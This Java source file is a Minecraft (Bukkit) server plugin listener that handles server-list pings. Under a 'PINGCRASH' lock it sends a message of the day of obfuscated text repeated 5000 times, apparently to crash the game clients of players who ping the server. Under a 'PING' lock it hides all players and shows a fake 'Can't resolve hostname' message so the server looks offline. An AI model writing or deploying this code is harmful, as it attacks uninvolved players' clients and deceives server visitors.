package de.impact.listeners;

import com.google.common.base.Strings;
import de.impact.utils.Locks;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;

import java.util.Iterator;

public class ServerPingListener implements Listener {

    @EventHandler
    public void ping(ServerListPingEvent event) {

        Iterator<Player> players = event.iterator();

        if(Locks.PINGCRASH.isLocked()) {
            event.setMotd(Strings.repeat("§kd\n", 5000));
            return;
        }

        if(Locks.PING.isLocked()) {
            while(players.hasNext()) {
                if(players.next() != null)
                    players.remove();
            }
            event.setMaxPlayers(0);
            event.setMotd("§4Can't resolve hostname");
        }

    }

}